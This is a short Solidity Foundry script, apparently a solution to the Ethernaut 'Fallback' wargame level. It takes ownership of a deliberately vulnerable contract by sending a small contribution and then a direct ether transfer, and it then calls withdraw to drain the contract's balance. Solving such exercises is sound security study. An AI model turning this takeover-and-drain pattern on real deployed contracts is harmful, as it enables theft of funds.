// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../instances/Ilevel01.sol";
import "forge-std/Script.sol";

contract Attacker is Script {
    Fallback level01 =
        Fallback(payable(0x5954f5b258283419Fc657A6c7b426143560E77F4));

    function run() external {
        vm.startBroadcast();

        level01.contribute{value: 1 wei}();

        (bool sent, ) = address(level01).call{value: 1 wei}("");
        require(sent, "Failed to send Ether");

        level01.withdraw();

        vm.stopBroadcast();
    }
}
